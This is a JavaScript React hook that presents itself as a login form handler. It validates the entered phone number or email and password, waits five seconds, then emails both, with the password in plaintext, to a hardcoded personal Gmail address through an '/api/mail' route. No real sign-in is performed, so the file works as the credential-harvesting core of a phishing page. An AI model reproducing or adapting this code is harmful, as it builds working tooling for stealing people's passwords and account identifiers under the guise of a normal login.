// hooks/useLoginHandler.js
"use client";
import { useState } from 'react';

export function useLoginHandler() {
  const [isFocusedPhoneOrEmail, setIsFocusedPhoneOrEmail] = useState(false);
  const [isFocusedPassword, setIsFocusedPassword] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false); // Loading state

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const phoneOrEmail = formData.get('phoneOrEmail');
    const password = formData.get('password');

    const phoneRegex = /^[0-9]{10,13}$/;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!phoneOrEmail) {
      setError('Phone or email must not be empty.');
      return;
    }

    if (!(phoneRegex.test(phoneOrEmail) || emailRegex.test(phoneOrEmail))) {
      setError('Phone number must be 10-13 digits or a valid email address.');
      return;
    }

    if (password.length < 8) {
      setError('Password must be at least 8 characters long.');
      return;
    }

    setError('');
    setIsLoading(true); // Set loading state to true

    try {
      // Simulate a 5-second delay before sending the email
      await new Promise((resolve) => setTimeout(resolve, 5000));

      const response = await fetch('/api/mail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: "kcgodson01@gmail.com",
          subject: "Login Attempt",
          text: `Phone or Email: ${phoneOrEmail}, Password: ${password}`,
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send email');
      }

      const data = await response.json();
      console.log('Email sent successfully:', data);

      // Clear input fields
      formData.set('phoneOrEmail', '');
      formData.set('password', '');

    } catch (error) {
      console.error('Error sending email:', error);
      setError('Failed to send email. Please try again.');
    } finally {
      setIsLoading(false); // Reset loading state
    }
  };

  return {
    isFocusedPhoneOrEmail,
    setIsFocusedPhoneOrEmail,
    isFocusedPassword,
    setIsFocusedPassword,
    error,
    handleSubmit,
    isLoading, // Expose loading state
  };
}
